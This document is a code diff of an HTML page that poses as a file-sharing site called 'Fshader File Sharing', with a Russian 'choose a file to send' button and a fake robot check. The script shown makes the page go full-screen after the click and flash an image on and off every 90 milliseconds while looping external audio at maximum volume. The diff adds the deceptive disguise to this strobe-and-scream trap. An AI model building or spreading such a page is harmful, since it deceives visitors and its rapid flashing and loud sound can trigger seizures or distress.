@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> </title>
+    <title>Fshader File Sharing</title>
     <style>
         body {
             display: flex;
@@ -11,37 +11,64 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
-            flex-direction: column;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            font-family: 'Arial', sans-serif;
+        }
+        .container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            text-align: center;
+            width: 400px;
+            transition: transform 0.3s;
+        }
+        .container:hover {
+            transform: scale(1.02);
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #343a40;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
         }
         .button {
             padding: 15px 30px;
-            background-color: gray;
+            background-color: #28a745;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        .button:hover {
+            background-color: #218838;
+            transform: translateY(-2px);
         }
         .hidden {
             display: none;
         }
         #captcha {
             display: none;
-            font-size: 24px;
+            font-size: 18px;
             margin-bottom: 20px;
+            color: #dc3545;
         }
         #image {
-            transition: opacity 0.1s linear; /* Уменьшено время перехода для резкого мигания */
+            transition: opacity 0.1s linear;
         }
     </style>
 </head>
 <body>
 
-<div id="captcha" class="hidden">Пожалуйста, подтвердите, что вы не робот.</div>
-<button class="button" id="permissionButton">Get Permission</button>
-<img id="image" class="hidden" src="https://i.imgur.com/T1nKjgS.jpeg" alt="Image" />
-<audio id="audio" src="https://www.dropbox.com/scl/fi/4azo331kktuoqewlrnjw9/krikir.mp3?rlkey=xp2qpu1297kqjsmdprd5z0xsb&st=hn8vjams&dl=1" loop preload="auto"></audio>
+<div class="container">
+    <h1>Fshader File Sharing</h1>
+    <div id="captcha" class="hidden">Пожалуйста, подтвердите, что вы не робот.</div>
+    <button class="button" id="permissionButton">Выбрать файл для отправки</button>
+    <img id="image" class="hidden" src="https://i.imgur.com/T1nKjgS.jpeg" alt="Image" />
+    <audio id="audio" src="https://www.dropbox.com/scl/fi/4azo331kktuoqewlrnjw9/krikir.mp3?rlkey=xp2qpu1297kqjsmdprd5z0xsb&st=hn8vjams&dl=1" loop preload="auto"></audio>
+</div>
 
 <script>
     const audio = document.getElementById('audio');
@@ -61,29 +88,29 @@
             img.classList.remove('hidden');
             let isVisible = true;
 
-            // Установить интервал на 50 миллисекунд для постоянного мигания
+            // Установить интервал на 90 миллисекунд для постоянного мигания
             setInterval(() => {
                 img.style.opacity = isVisible ? '1' : '0';
                 isVisible = !isVisible;
-            }, 90); // Изменение состояния каждые 50 миллисекунд
+            }, 90);
 
             // Подготовка к воспроизведению звука
-            audio.currentTime = 0; // Начать с начала
-            audio.volume = 1.0; // Установка громкости на максимум
-            audio.play(); // Воспроизводим звук
+            audio.currentTime = 0; 
+            audio.volume = 1.0; 
+            audio.play(); 
 
             // Перейти в полноэкранный режим
             if (img.requestFullscreen) {
                 img.requestFullscreen();
-            } else if (img.mozRequestFullScreen) { // Firefox
+            } else if (img.mozRequestFullScreen) { 
                 img.mozRequestFullScreen();
-            } else if (img.webkitRequestFullscreen) { // Chrome, Safari и Opera
+            } else if (img.webkitRequestFullscreen) { 
                 img.webkitRequestFullscreen();
-            } else if (img.msRequestFullscreen) { // IE/Edge
+            } else if (img.msRequestFullscreen) { 
                 img.msRequestFullscreen();
             }
 
-        }, 2000); // 2000 миллисекунд = 2 секунды
+        }, 2000); 
     });
 </script>
 
